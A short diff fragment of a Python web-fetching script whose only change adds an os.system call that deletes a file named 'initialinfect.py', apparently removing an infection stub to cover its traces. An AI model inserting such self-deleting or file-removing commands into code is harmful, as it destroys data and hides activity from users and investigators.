@@ -3,6 +3,7 @@ from urllib.request import urlopen
 from bs4 import BeautifulSoup
 import os
 
+os.system("rm initialinfect.py")
 runcode = True
 
 while (runcode):
